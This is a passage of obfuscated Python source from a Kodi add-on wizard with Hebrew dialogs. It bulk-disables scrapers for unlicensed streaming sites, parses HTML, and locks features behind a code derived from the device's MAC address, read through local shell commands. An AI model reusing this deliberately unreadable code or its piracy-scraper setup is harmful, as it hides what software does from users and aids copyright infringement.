		OO0OOOOO0OOO0OOOO .setSetting ('vidc','false')#line:1216
		OO0OOOOO0OOO0OOOO .setSetting ('w4hd','false')#line:1217
		OO0OOOOO0OOO0OOOO .setSetting ('wav','false')#line:1218
		OO0OOOOO0OOO0OOOO .setSetting ('wf','false')#line:1219
		OO0OOOOO0OOO0OOOO .setSetting ('wse','false')#line:1220
		OO0OOOOO0OOO0OOOO .setSetting ('wss','false')#line:1221
		OO0OOOOO0OOO0OOOO .setSetting ('wsse','false')#line:1222
		OO0OOOOO0OOO0OOOO =xbmcaddon .Addon ('plugin.video.speedmax')#line:1223
		OO0OOOOO0OOO0OOOO .setSetting ('debrid.only','true')#line:1224
		OO0OOOOO0OOO0OOOO .setSetting ('hosts.captcha','false')#line:1225
		OO0OOOOO0OOO0OOOO =xbmcaddon .Addon ('script.module.civitasscrapers')#line:1226
		OO0OOOOO0OOO0OOOO .setSetting ('provider.123moviehd','false')#line:1227
		OO0OOOOO0OOO0OOOO .setSetting ('provider.300mbdownload','false')#line:1228
		OO0OOOOO0OOO0OOOO .setSetting ('provider.alltube','false')#line:1229
		OO0OOOOO0OOO0OOOO .setSetting ('provider.allucde','false')#line:1230
		OO0OOOOO0OOO0OOOO .setSetting ('provider.animebase','false')#line:1231
		OO0OOOOO0OOO0OOOO .setSetting ('provider.animeloads','false')#line:1232
		OO0OOOOO0OOO0OOOO .setSetting ('provider.animetoon','false')#line:1233
		OO0OOOOO0OOO0OOOO .setSetting ('provider.bnwmovies','false')#line:1234
		OO0OOOOO0OOO0OOOO .setSetting ('provider.boxfilm','false')#line:1235
		OO0OOOOO0OOO0OOOO .setSetting ('provider.bs','false')#line:1236
		OO0OOOOO0OOO0OOOO .setSetting ('provider.cartoonhd','false')#line:1237
		OO0OOOOO0OOO0OOOO .setSetting ('provider.cdahd','false')#line:1238
		OO0OOOOO0OOO0OOOO .setSetting ('provider.cdax','false')#line:1239
		OO0OOOOO0OOO0OOOO .setSetting ('provider.cine','false')#line:1240
		OO0OOOOO0OOO0OOOO .setSetting ('provider.cinenator','false')#line:1241
		OO0OOOOO0OOO0OOOO .setSetting ('provider.cmovieshdbz','false')#line:1242
		OO0OOOOO0OOO0OOOO .setSetting ('provider.coolmoviezone','false')#line:1243
		OO0OOOOO0OOO0OOOO .setSetting ('provider.ddl','false')#line:1244
		OO0OOOOO0OOO0OOOO .setSetting ('provider.deepmovie','false')#line:1245
		OO0OOOOO0OOO0OOOO .setSetting ('provider.ekinomaniak','false')#line:1246
		OO0OOOOO0OOO0OOOO .setSetting ('provider.ekinotv','false')#line:1247
		OO0OOOOO0OOO0OOOO .setSetting ('provider.filiser','false')#line:1248
		OO0OOOOO0OOO0OOOO .setSetting ('provider.filmpalast','false')#line:1249
		OO0OOOOO0OOO0OOOO .setSetting ('provider.filmwebbooster','false')#line:1250
		OO0OOOOO0OOO0OOOO .setSetting ('provider.filmxy','false')#line:1251
		OO0OOOOO0OOO0OOOO .setSetting ('provider.fmovies','false')#line:1252
		OO0OOOOO0OOO0OOOO .setSetting ('provider.foxx','false')#line:1253
		OO0OOOOO0OOO0OOOO .setSetting ('provider.freefmovies','false')#line:1254
		OO0OOOOO0OOO0OOOO .setSetting ('provider.freeputlocker','false')#line:1255
		OO0OOOOO0OOO0OOOO .setSetting ('provider.furk','false')#line:1256
		OO0OOOOO0OOO0OOOO .setSetting ('provider.gamatotv','false')#line:1257
		OO0OOOOO0OOO0OOOO .setSetting ('provider.gogoanime','false')#line:1258
		OO0OOOOO0OOO0OOOO .setSetting ('provider.gowatchseries','false')#line:1259
		OO0OOOOO0OOO0OOOO .setSetting ('provider.hackimdb','false')#line:1260
		OO0OOOOO0OOO0OOOO .setSetting ('provider.hdfilme','false')#line:1261
		OO0OOOOO0OOO0OOOO .setSetting ('provider.hdmto','false')#line:1262
		OO0OOOOO0OOO0OOOO .setSetting ('provider.hdpopcorns','false')#line:1263
		OO0OOOOO0OOO0OOOO .setSetting ('provider.hdstreams','false')#line:1264
		OO0OOOOO0OOO0OOOO .setSetting ('provider.horrorkino','false')#line:1266
		OO0OOOOO0OOO0OOOO .setSetting ('provider.iitv','false')#line:1267
		OO0OOOOO0OOO0OOOO .setSetting ('provider.iload','false')#line:1268
		OO0OOOOO0OOO0OOOO .setSetting ('provider.iwaatch','false')#line:1269
		OO0OOOOO0OOO0OOOO .setSetting ('provider.kinodogs','false')#line:1270
		OO0OOOOO0OOO0OOOO .setSetting ('provider.kinoking','false')#line:1271
		OO0OOOOO0OOO0OOOO .setSetting ('provider.kinow','false')#line:1272
		OO0OOOOO0OOO0OOOO .setSetting ('provider.kinox','false')#line:1273
		OO0OOOOO0OOO0OOOO .setSetting ('provider.lichtspielhaus','false')#line:1274
		OO0OOOOO0OOO0OOOO .setSetting ('provider.liomenoi','false')#line:1275
		OO0OOOOO0OOO0OOOO .setSetting ('provider.magnetdl','false')#line:1278
		OO0OOOOO0OOO0OOOO .setSetting ('provider.megapelistv','false')#line:1279
		OO0OOOOO0OOO0OOOO .setSetting ('provider.movie2k-ac','false')#line:1280
		OO0OOOOO0OOO0OOOO .setSetting ('provider.movie2k-ag','false')#line:1281
		OO0OOOOO0OOO0OOOO .setSetting ('provider.movie2z','false')#line:1282
		OO0OOOOO0OOO0OOOO .setSetting ('provider.movie4k','false')#line:1283
		OO0OOOOO0OOO0OOOO .setSetting ('provider.movie4kis','false')#line:1284
		OO0OOOOO0OOO0OOOO .setSetting ('provider.movieneo','false')#line:1285
		OO0OOOOO0OOO0OOOO .setSetting ('provider.moviesever','false')#line:1286
		OO0OOOOO0OOO0OOOO .setSetting ('provider.movietown','false')#line:1287
		OO0OOOOO0OOO0OOOO .setSetting ('provider.mvrls','false')#line:1289
		OO0OOOOO0OOO0OOOO .setSetting ('provider.netzkino','false')#line:1290
		OO0OOOOO0OOO0OOOO .setSetting ('provider.odb','false')#line:1291
		OO0OOOOO0OOO0OOOO .setSetting ('provider.openkatalog','false')#line:1292
		OO0OOOOO0OOO0OOOO .setSetting ('provider.ororo','false')#line:1293
		OO0OOOOO0OOO0OOOO .setSetting ('provider.paczamy','false')#line:1294
		OO0OOOOO0OOO0OOOO .setSetting ('provider.peliculasdk','false')#line:1295
		OO0OOOOO0OOO0OOOO .setSetting ('provider.pelisplustv','false')#line:1296
		OO0OOOOO0OOO0OOOO .setSetting ('provider.pepecine','false')#line:1297
		OO0OOOOO0OOO0OOOO .setSetting ('provider.primewire','false')#line:1298
		OO0OOOOO0OOO0OOOO .setSetting ('provider.projectfreetv','false')#line:1299
		OO0OOOOO0OOO0OOOO .setSetting ('provider.proxer','false')#line:1300
		OO0OOOOO0OOO0OOOO .setSetting ('provider.pureanime','false')#line:1301
		OO0OOOOO0OOO0OOOO .setSetting ('provider.putlocker','false')#line:1302
		OO0OOOOO0OOO0OOOO .setSetting ('provider.putlockerfree','false')#line:1303
		OO0OOOOO0OOO0OOOO .setSetting ('provider.reddit','false')#line:1304
		OO0OOOOO0OOO0OOOO .setSetting ('provider.cartoonwire','false')#line:1305
		OO0OOOOO0OOO0OOOO .setSetting ('provider.seehd','false')#line:1306
		OO0OOOOO0OOO0OOOO .setSetting ('provider.segos','false')#line:1307
		OO0OOOOO0OOO0OOOO .setSetting ('provider.serienstream','false')#line:1308
		OO0OOOOO0OOO0OOOO .setSetting ('provider.series9','false')#line:1309
		OO0OOOOO0OOO0OOOO .setSetting ('provider.seriesever','false')#line:1310
		OO0OOOOO0OOO0OOOO .setSetting ('provider.seriesonline','false')#line:1311
		OO0OOOOO0OOO0OOOO .setSetting ('provider.seriespapaya','false')#line:1312
		OO0OOOOO0OOO0OOOO .setSetting ('provider.sezonlukdizi','false')#line:1313
		OO0OOOOO0OOO0OOOO .setSetting ('provider.solarmovie','false')#line:1314
		OO0OOOOO0OOO0OOOO .setSetting ('provider.solarmoviez','false')#line:1315
		OO0OOOOO0OOO0OOOO .setSetting ('provider.stream-to','false')#line:1316
		OO0OOOOO0OOO0OOOO .setSetting ('provider.streamdream','false')#line:1317
		OO0OOOOO0OOO0OOOO .setSetting ('provider.streamflix','false')#line:1318
		OO0OOOOO0OOO0OOOO .setSetting ('provider.streamit','false')#line:1319
		OO0OOOOO0OOO0OOOO .setSetting ('provider.swatchseries','false')#line:1320
		OO0OOOOO0OOO0OOOO .setSetting ('provider.szukajkatv','false')#line:1321
		OO0OOOOO0OOO0OOOO .setSetting ('provider.tainiesonline','false')#line:1322
		OO0OOOOO0OOO0OOOO .setSetting ('provider.tainiomania','false')#line:1323
		OO0OOOOO0OOO0OOOO .setSetting ('provider.tata','false')#line:1326
		OO0OOOOO0OOO0OOOO .setSetting ('provider.trt','false')#line:1327
		OO0OOOOO0OOO0OOOO .setSetting ('provider.tvbox','false')#line:1328
		OO0OOOOO0OOO0OOOO .setSetting ('provider.ultrahd','false')#line:1329
		OO0OOOOO0OOO0OOOO .setSetting ('provider.video4k','false')#line:1330
		OO0OOOOO0OOO0OOOO .setSetting ('provider.vidics','false')#line:1331
		OO0OOOOO0OOO0OOOO .setSetting ('provider.view4u','false')#line:1332
		OO0OOOOO0OOO0OOOO .setSetting ('provider.watchseries','false')#line:1333
		OO0OOOOO0OOO0OOOO .setSetting ('provider.xrysoi','false')#line:1334
		OO0OOOOO0OOO0OOOO .setSetting ('provider.library','false')#line:1335
def fixfont ():#line:1338
	O0O0OOOO000OO0OO0 =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.GetSettings","id":1}')#line:1339
	OO00O0OOOO00OOOO0 =json .loads (O0O0OOOO000OO0OO0 );#line:1341
	O0O0O000O0OOO0OOO =OO00O0OOOO00OOOO0 ["result"]["settings"]#line:1342
	O000O0O0000OO0OOO =[OOO00000OOO00OO00 for OOO00000OOO00OO00 in O0O0O000O0OOO0OOO if OOO00000OOO00OO00 ["id"]=="audiooutput.audiodevice"][0 ]#line:1344
	OOO0O0OO000O0OO00 =O000O0O0000OO0OOO ["options"];#line:1345
	O0OO0OOO000000O00 =O000O0O0000OO0OOO ["value"];#line:1346
	O0OO000O00OO000OO =[O0OO0O0000OO000OO for (O0OO0O0000OO000OO ,O00000O0O0OOOO0O0 )in enumerate (OOO0O0OO000O0OO00 )if O00000O0O0OOOO0O0 ["value"]==O0OO0OOO000000O00 ][0 ];#line:1348
	OOO00O0000OO0O000 =(O0OO000O00OO000OO +1 )%len (OOO0O0OO000O0OO00 )#line:1350
	O00OO0OO000OOO000 =OOO0O0OO000O0OO00 [OOO00O0000OO0O000 ]["value"]#line:1352
	OO000O0O000O00O0O =OOO0O0OO000O0OO00 [OOO00O0000OO0O000 ]["label"]#line:1353
	OOO0O0OO000O0OOO0 =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","params":{"setting":"subtitles.height","value":40},"id":1}')#line:1355
	try :#line:1357
		O00O00OOOO000O00O =json .loads (OOO0O0OO000O0OOO0 );#line:1358
		if O00O00OOOO000O00O ["result"]!=True :#line:1360
			raise Exception #line:1361
	except :#line:1362
		sys .stderr .write ("Error switching audio output device")#line:1363
		raise Exception #line:1364
def parseDOM2 (O00O00O00000OO00O ,name =u"",attrs ={},ret =False ):#line:1365
	if isinstance (O00O00O00000OO00O ,str ):#line:1368
		try :#line:1369
			O00O00O00000OO00O =[O00O00O00000OO00O .decode ("utf-8")]#line:1370
		except :#line:1371
			O00O00O00000OO00O =[O00O00O00000OO00O ]#line:1372
	elif isinstance (O00O00O00000OO00O ,unicode ):#line:1373
		O00O00O00000OO00O =[O00O00O00000OO00O ]#line:1374
	elif not isinstance (O00O00O00000OO00O ,list ):#line:1375
		return u""#line:1376
	if not name .strip ():#line:1378
		return u""#line:1379
	OO0O0O000OOOO0O0O =[]#line:1381
	for OO00O0000000O0000 in O00O00O00000OO00O :#line:1382
		O0000O0O0OOO0OOOO =re .compile ('(<[^>]*?\n[^>]*?>)').findall (OO00O0000000O0000 )#line:1383
		for OO0O0O00OO000OO0O in O0000O0O0OOO0OOOO :#line:1384
			OO00O0000000O0000 =OO00O0000000O0000 .replace (OO0O0O00OO000OO0O ,OO0O0O00OO000OO0O .replace ("\n"," "))#line:1385
		OOOO00O0000000O00 =[]#line:1387
		for O0OOO0OOOO000OO0O in attrs :#line:1388
			OOOO0OO0000000O00 =re .compile ('(<'+name +'[^>]*?(?:'+O0OOO0OOOO000OO0O +'=[\'"]'+attrs [O0OOO0OOOO000OO0O ]+'[\'"].*?>))',re .M |re .S ).findall (OO00O0000000O0000 )#line:1389
			if len (OOOO0OO0000000O00 )==0 and attrs [O0OOO0OOOO000OO0O ].find (" ")==-1 :#line:1390
				OOOO0OO0000000O00 =re .compile ('(<'+name +'[^>]*?(?:'+O0OOO0OOOO000OO0O +'='+attrs [O0OOO0OOOO000OO0O ]+'.*?>))',re .M |re .S ).findall (OO00O0000000O0000 )#line:1391
			if len (OOOO00O0000000O00 )==0 :#line:1393
				OOOO00O0000000O00 =OOOO0OO0000000O00 #line:1394
				OOOO0OO0000000O00 =[]#line:1395
			else :#line:1396
				OO00O00OOOO0000O0 =range (len (OOOO00O0000000O00 ))#line:1397
				OO00O00OOOO0000O0 .reverse ()#line:1398
				for OOO000OO00000O0OO in OO00O00OOOO0000O0 :#line:1399
					if not OOOO00O0000000O00 [OOO000OO00000O0OO ]in OOOO0OO0000000O00 :#line:1400
						del (OOOO00O0000000O00 [OOO000OO00000O0OO ])#line:1401
		if len (OOOO00O0000000O00 )==0 and attrs =={}:#line:1403
			OOOO00O0000000O00 =re .compile ('(<'+name +'>)',re .M |re .S ).findall (OO00O0000000O0000 )#line:1404
			if len (OOOO00O0000000O00 )==0 :#line:1405
				OOOO00O0000000O00 =re .compile ('(<'+name +' .*?>)',re .M |re .S ).findall (OO00O0000000O0000 )#line:1406
		if isinstance (ret ,str ):#line:1408
			OOOO0OO0000000O00 =[]#line:1409
			for OO0O0O00OO000OO0O in OOOO00O0000000O00 :#line:1410
				O0O0OOOO0O0O0000O =re .compile ('<'+name +'.*?'+ret +'=([\'"].[^>]*?[\'"])>',re .M |re .S ).findall (OO0O0O00OO000OO0O )#line:1411
				if len (O0O0OOOO0O0O0000O )==0 :#line:1412
					O0O0OOOO0O0O0000O =re .compile ('<'+name +'.*?'+ret +'=(.[^>]*?)>',re .M |re .S ).findall (OO0O0O00OO000OO0O )#line:1413
				for O0O0O0OOO00OOO00O in O0O0OOOO0O0O0000O :#line:1414
					OOOO000000O0OO00O =O0O0O0OOO00OOO00O [0 ]#line:1415
					if OOOO000000O0OO00O in "'\"":#line:1416
						if O0O0O0OOO00OOO00O .find ('='+OOOO000000O0OO00O ,O0O0O0OOO00OOO00O .find (OOOO000000O0OO00O ,1 ))>-1 :#line:1417
							O0O0O0OOO00OOO00O =O0O0O0OOO00OOO00O [:O0O0O0OOO00OOO00O .find ('='+OOOO000000O0OO00O ,O0O0O0OOO00OOO00O .find (OOOO000000O0OO00O ,1 ))]#line:1418
						if O0O0O0OOO00OOO00O .rfind (OOOO000000O0OO00O ,1 )>-1 :#line:1420
							O0O0O0OOO00OOO00O =O0O0O0OOO00OOO00O [1 :O0O0O0OOO00OOO00O .rfind (OOOO000000O0OO00O )]#line:1421
					else :#line:1422
						if O0O0O0OOO00OOO00O .find (" ")>0 :#line:1423
							O0O0O0OOO00OOO00O =O0O0O0OOO00OOO00O [:O0O0O0OOO00OOO00O .find (" ")]#line:1424
						elif O0O0O0OOO00OOO00O .find ("/")>0 :#line:1425
							O0O0O0OOO00OOO00O =O0O0O0OOO00OOO00O [:O0O0O0OOO00OOO00O .find ("/")]#line:1426
						elif O0O0O0OOO00OOO00O .find (">")>0 :#line:1427
							O0O0O0OOO00OOO00O =O0O0O0OOO00OOO00O [:O0O0O0OOO00OOO00O .find (">")]#line:1428
					OOOO0OO0000000O00 .append (O0O0O0OOO00OOO00O .strip ())#line:1430
			OOOO00O0000000O00 =OOOO0OO0000000O00 #line:1431
		else :#line:1432
			OOOO0OO0000000O00 =[]#line:1433
			for OO0O0O00OO000OO0O in OOOO00O0000000O00 :#line:1434
				O00OOO0O0OOO0O00O =u"</"+name #line:1435
				O000000O00OOOOOO0 =OO00O0000000O0000 .find (OO0O0O00OO000OO0O )#line:1437
				O0OOO0OO000O0O000 =OO00O0000000O0000 .find (O00OOO0O0OOO0O00O ,O000000O00OOOOOO0 )#line:1438
				O0O0O00O00OO0OOOO =OO00O0000000O0000 .find ("<"+name ,O000000O00OOOOOO0 +1 )#line:1439
				while O0O0O00O00OO0OOOO <O0OOO0OO000O0O000 and O0O0O00O00OO0OOOO !=-1 :#line:1441
					O0O0O0O0O0OOOOO0O =OO00O0000000O0000 .find (O00OOO0O0OOO0O00O ,O0OOO0OO000O0O000 +len (O00OOO0O0OOO0O00O ))#line:1442
					if O0O0O0O0O0OOOOO0O !=-1 :#line:1443
						O0OOO0OO000O0O000 =O0O0O0O0O0OOOOO0O #line:1444
					O0O0O00O00OO0OOOO =OO00O0000000O0000 .find ("<"+name ,O0O0O00O00OO0OOOO +1 )#line:1445
				if O000000O00OOOOOO0 ==-1 and O0OOO0OO000O0O000 ==-1 :#line:1447
					OOO0O0O0O0O00O0OO =u""#line:1448
				elif O000000O00OOOOOO0 >-1 and O0OOO0OO000O0O000 >-1 :#line:1449
					OOO0O0O0O0O00O0OO =OO00O0000000O0000 [O000000O00OOOOOO0 +len (OO0O0O00OO000OO0O ):O0OOO0OO000O0O000 ]#line:1450
				elif O0OOO0OO000O0O000 >-1 :#line:1451
					OOO0O0O0O0O00O0OO =OO00O0000000O0000 [:O0OOO0OO000O0O000 ]#line:1452
				elif O000000O00OOOOOO0 >-1 :#line:1453
					OOO0O0O0O0O00O0OO =OO00O0000000O0000 [O000000O00OOOOOO0 +len (OO0O0O00OO000OO0O ):]#line:1454
				if ret :#line:1456
					O00OOO0O0OOO0O00O =OO00O0000000O0000 [O0OOO0OO000O0O000 :OO00O0000000O0000 .find (">",OO00O0000000O0000 .find (O00OOO0O0OOO0O00O ))+1 ]#line:1457
					OOO0O0O0O0O00O0OO =OO0O0O00OO000OO0O +OOO0O0O0O0O00O0OO +O00OOO0O0OOO0O00O #line:1458
				OO00O0000000O0000 =OO00O0000000O0000 [OO00O0000000O0000 .find (OOO0O0O0O0O00O0OO ,OO00O0000000O0000 .find (OO0O0O00OO000OO0O ))+len (OOO0O0O0O0O00O0OO ):]#line:1460
				OOOO0OO0000000O00 .append (OOO0O0O0O0O00O0OO )#line:1461
			OOOO00O0000000O00 =OOOO0OO0000000O00 #line:1462
		OO0O0O000OOOO0O0O +=OOOO00O0000000O00 #line:1463
	return OO0O0O000OOOO0O0O #line:1465
def addItem (O0O00O00OO0O0OOO0 ,OO0O0O0OOOOOO0000 ,O0OOOO0OO0O0O000O ,O00O000OO0OOOO0OO ,O0O0O000O0O00O0OO ,description =None ):#line:1467
	if description ==None :description =''#line:1468
	description ='[COLOR white]'+description +'[/COLOR]'#line:1469
	OO0O0O0O0O0000OO0 =sys .argv [0 ]+"?url="+urllib .quote_plus (OO0O0O0OOOOOO0000 )+"&mode="+str (O0OOOO0OO0O0O000O )+"&name="+urllib .quote_plus (O0O00O00OO0O0OOO0 )+"&iconimage="+urllib .quote_plus (O00O000OO0OOOO0OO )+"&fanart="+urllib .quote_plus (O0O0O000O0O00O0OO )#line:1470
	O0OO00O0O00O0O0OO =True #line:1471
	O00000OO0000OO0O0 =xbmcgui .ListItem (O0O00O00OO0O0OOO0 ,iconImage =O00O000OO0OOOO0OO ,thumbnailImage =O00O000OO0OOOO0OO )#line:1472
	O00000OO0000OO0O0 .setInfo (type ="Video",infoLabels ={"Title":O0O00O00OO0O0OOO0 ,"Plot":description })#line:1473
	O00000OO0000OO0O0 .setProperty ("fanart_Image",O0O0O000O0O00O0OO )#line:1474
	O00000OO0000OO0O0 .setProperty ("icon_Image",O00O000OO0OOOO0OO )#line:1475
	O0OO00O0O00O0O0OO =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =OO0O0O0O0O0000OO0 ,listitem =O00000OO0000OO0O0 ,isFolder =False )#line:1476
	return O0OO00O0O00O0O0OO #line:1477
def get_params ():#line:1479
		O0O0O00000OO00O00 =[]#line:1480
		O000OOO00OOO00OOO =sys .argv [2 ]#line:1481
		if len (O000OOO00OOO00OOO )>=2 :#line:1482
				OO0000O0O0OOO00O0 =sys .argv [2 ]#line:1483
				O00OOO00O000O0O00 =OO0000O0O0OOO00O0 .replace ('?','')#line:1484
				if (OO0000O0O0OOO00O0 [len (OO0000O0O0OOO00O0 )-1 ]=='/'):#line:1485
						OO0000O0O0OOO00O0 =OO0000O0O0OOO00O0 [0 :len (OO0000O0O0OOO00O0 )-2 ]#line:1486
				O0O00O0OO00O0OO00 =O00OOO00O000O0O00 .split ('&')#line:1487
				O0O0O00000OO00O00 ={}#line:1488
				for OO00OOOO0O00O0OOO in range (len (O0O00O0OO00O0OO00 )):#line:1489
						O0OO00OOO0000OO00 ={}#line:1490
						O0OO00OOO0000OO00 =O0O00O0OO00O0OO00 [OO00OOOO0O00O0OOO ].split ('=')#line:1491
						if (len (O0OO00OOO0000OO00 ))==2 :#line:1492
								O0O0O00000OO00O00 [O0OO00OOO0000OO00 [0 ]]=O0OO00OOO0000OO00 [1 ]#line:1493
		return O0O0O00000OO00O00 #line:1495
def decode (OOOOO000OO0O00OOO ,OOO000OOOOO0000OO ):#line:1500
    import base64 #line:1501
    O0O0OO00OOO0O00O0 =[]#line:1502
    if (len (OOOOO000OO0O00OOO ))!=4 :#line:1504
     return 10 #line:1505
    OOO000OOOOO0000OO =base64 .urlsafe_b64decode (OOO000OOOOO0000OO )#line:1506
    for O000O0OOO000OO0OO in range (len (OOO000OOOOO0000OO )):#line:1508
        O0OOOOO00000OO0OO =OOOOO000OO0O00OOO [O000O0OOO000OO0OO %len (OOOOO000OO0O00OOO )]#line:1509
        OO0O00OOOOO0OO00O =chr ((256 +ord (OOO000OOOOO0000OO [O000O0OOO000OO0OO ])-ord (O0OOOOO00000OO0OO ))%256 )#line:1510
        O0O0OO00OOO0O00O0 .append (OO0O00OOOOO0OO00O )#line:1511
    return "".join (O0O0OO00OOO0O00O0 )#line:1512
def tmdb_list (OO0OOOOO0OOOO000O ):#line:1513
    O000O00O0OO0O0O00 =decode ("7643",OO0OOOOO0OOOO000O )#line:1516
    return int (O000O00O0OO0O0O00 )#line:1519
def u_list (OO00OOO0000O0O000 ):#line:1520
    from math import sqrt #line:1522
    OOO000OOOOO00OOO0 =tmdb_list (TMDB_NEW_API )#line:1523
    O00OOOOO0OO0000O0 =str ((getHwAddr ('eth0'))*OOO000OOOOO00OOO0 )#line:1525
    O000OOO0OO0O000OO =int (O00OOOOO0OO0000O0 [1 ]+O00OOOOO0OO0000O0 [2 ]+O00OOOOO0OO0000O0 [5 ]+O00OOOOO0OO0000O0 [7 ])#line:1526
    OOOOOO0OOO0000O0O =(ADDON .getSetting ("pass"))#line:1528
    O000O00O00O00O0OO =(str (round (sqrt ((O000OOO0OO0O000OO *700 )+50 )+50 ,4 ))[-4 :]).replace ('.','')#line:1533
    if '.'in O000O00O00O00O0OO :#line:1534
     O000O00O00O00O0OO =(str (round (sqrt ((O000OOO0OO0O000OO *700 )+50 )+50 ,4 ))[-5 :]).replace ('.','')#line:1535
    logging .warning (O000O00O00O00O0OO )#line:1536
    if OOOOOO0OOO0000O0O ==O000O00O00O00O0OO :#line:1537
      OO0OO0OO0O00OO000 =OO00OOO0000O0O000 #line:1539
    else :#line:1541
       if STARTP2 ()and STARTP ()=='ok':#line:1542
         return OO00OOO0000O0O000 #line:1545
       OO0OO0OO0O00OO000 ='https://www.google.com/search?&q=don%27t+take+my+money&oq=dont+take+my+moniey'#line:1546
       xbmcgui .Dialog ().ok ('הקוד שלך',' סיסמה שגויה')#line:1547
       sys .exit ()#line:1548
    return OO0OO0OO0O00OO000 #line:1549
def disply_hwr ():#line:1551
   O00O0OOO000000O00 =tmdb_list (TMDB_NEW_API )#line:1552
   O00O00O0O0O0O0OO0 =str ((getHwAddr ('eth0'))*O00O0OOO000000O00 )#line:1553
   O00OOOOO00O0O000O =(O00O00O0O0O0O0OO0 [1 ]+O00O00O0O0O0O0OO0 [2 ]+O00O00O0O0O0O0OO0 [5 ]+O00O00O0O0O0O0OO0 [7 ])#line:1560
   OOO000000O000O0OO =(ADDON .getSetting ("action"))#line:1561
   wiz .setS ('action',str (O00OOOOO00O0O000O ))#line:1563
def disply_hwr2 ():#line:1564
   O0000OOOOO0OO0000 =tmdb_list (TMDB_NEW_API )#line:1565
   O00000OO0OO000O0O =str ((getHwAddr ('eth0'))*O0000OOOOO0OO0000 )#line:1566
   OOOOO00O0O000OO00 =(O00000OO0OO000O0O [1 ]+O00000OO0OO000O0O [2 ]+O00000OO0OO000O0O [5 ]+O00000OO0OO000O0O [7 ])#line:1573
   O0OOOO0OO0O000O00 =(ADDON .getSetting ("action"))#line:1574
   xbmcgui .Dialog ().ok ("[COLOR yellow] לשלוח את הקוד למנהלים [/COLOR]",OOOOO00O0O000OO00 )#line:1577
def getHwAddr (OO000O00OOO00OO0O ):#line:1579
   import subprocess ,time #line:1580
   O000O0OOOO000O000 ='windows'#line:1581
   if xbmc .getCondVisibility ('system.platform.android'):#line:1582
       O000O0OOOO000O000 ='android'#line:1583
   if (O000O0OOOO000O000 =='android'):#line:1584
     OO00O0OO000OO0OOO =subprocess .Popen (["exec ''ip link''"],executable ='/system/bin/sh',shell =True ,stdout =subprocess .PIPE ,stderr =subprocess .STDOUT ).communicate ()[0 ].splitlines ()#line:1585
     O00OO0000OO0O0OO0 =re .compile ('link/ether (.+?) brd').findall (str (OO00O0OO000OO0OOO ))#line:1587
     O0OO000O0000OOO0O =0 #line:1588
     for O00OOOOOOO00000O0 in O00OO0000OO0O0OO0 :#line:1589
      if O00OO0000OO0O0OO0 !='00:00:00:00:00:00':#line:1590
          O0OO0O0O000O00000 =O00OOOOOOO00000O0 #line:1591
          O0OO000O0000OOO0O =O0OO000O0000OOO0O +int (O0OO0O0O000O00000 .replace (':',''),16 )#line:1592
   else :#line:1594
       O000O00O00OOO0OOO =0 #line:1595
       O0OO000O0000OOO0O =0 #line:1596
       OOOOOOO0OO0OOOO00 =[]#line:1597
       O00000O0O000OO0OO =os .popen ("getmac").read ()#line:1598
       O00000O0O000OO0OO =O00000O0O000OO0OO .split ("\n")#line:1599
       for O000OOO000OOOOOO0 in O00000O0O000OO0OO :#line:1601
            OO0OOOO000OO000OO =re .search (r'([0-9A-F]{2}[:-]){5}([0-9A-F]{2})',O000OOO000OOOOOO0 ,re .I )#line:1602
            if OO0OOOO000OO000OO :#line:1603
                O00OO0000OO0O0OO0 =OO0OOOO000OO000OO .group ().replace ('-',':')#line:1604
                OOOOOOO0OO0OOOO00 .append (O00OO0000OO0O0OO0 )#line:1605
                O0OO000O0000OOO0O =O0OO000O0000OOO0O +int (O00OO0000OO0O0OO0 .replace (':',''),16 )#line:1608
       '''
       while(1):
         mac_address = xbmc.getInfoLabel("network.macaddress")
         logging.warning(mac_address)
         if mac_address!="Busy" and  mac_address!=' עסוק':
    
            break
         else:
           x=x+1
           time.sleep(1)
           if x>30:
            break
       '''#line:1622
   return O0OO000O0000OOO0O #line:1624
def getpass ():#line:1625
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.program.mediacenter/default.py?mode=9&url=clearCache)")#line:1627
def setpass ():#line:1628
    O0000O00O000OOOOO =xbmcgui .Dialog ()#line:1629
    O0O000O00O00O0000 =O0000O00O000OOOOO .numeric (0 ,'הכנס סיסמה')#line:1631
    wiz .setS ('pass',str (O0O000O00O00O0000 ))#line:1636
def setuname ():#line:1637
    O0000O0OOOOOOO000 =''#line:1638
    OO000OOO0OO00O0OO =xbmc .Keyboard (O0000O0OOOOOOO000 ,'הכנס שם משתמש')#line:1639
    OO000OOO0OO00O0OO .doModal ()#line:1640
    if OO000OOO0OO00O0OO .isConfirmed ():#line:1641
           O0000O0OOOOOOO000 =OO000OOO0OO00O0OO .getText ()#line:1642
           wiz .setS ('user',str (O0000O0OOOOOOO000 ))#line:1643
def powerkodi ():#line:1644
    os ._exit (1 )#line:1645
def buffer1 ():#line:1647
	OO00O00O00OOO00OO =xbmc .translatePath (os .path .join ('special://home/userdata','advancedsettings.xml'))#line:1648
	O0000OOO000O0OO0O =xbmc .getInfoLabel ("System.Memory(total)")#line:1649
	O0OOO000OO00O000O =xbmc .getInfoLabel ("System.FreeMemory")#line:1650
	O0OO0O00000OO0OO0 =re .sub ('[^0-9]','',O0OOO000OO00O000O )#line:1651
	O0OO0O00000OO0OO0 =int (O0OO0O00000OO0OO0 )/3 #line:1652
	O00O0OOOOOO0OOO00 =O0OO0O00000OO0OO0 *1024 *1024 #line:1653
	try :OO000O0OOOOO0000O =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:1654
	except :OO000O0OOOOO0000O =16 #line:1655
	OOOO0O00O00000000 =DIALOG .yesno ('FREE MEMORY: '+str (O0OOO000OO00O000O ),'Based on your free Memory your optimal buffersize is: '+str (O0OO0O00000OO0OO0 )+' MB','Choose an Option below...',yeslabel ='Use Optimal',nolabel ='Input a Value')#line:1658
	if OOOO0O00O00000000 ==1 :#line:1659
		with open (OO00O00O00OOO00OO ,"w")as O0OOOOOOOO0000O0O :#line:1660
			if OO000O0OOOOO0000O >=17 :OOO0O0000OOO0O0O0 =xml_data_advSettings_New (str (O00O0OOOOOO0OOO00 ))#line:1661
			else :OOO0O0000OOO0O0O0 =xml_data_advSettings_old (str (O00O0OOOOOO0OOO00 ))#line:1662
			O0OOOOOOOO0000O0O .write (OOO0O0000OOO0O0O0 )#line:1664
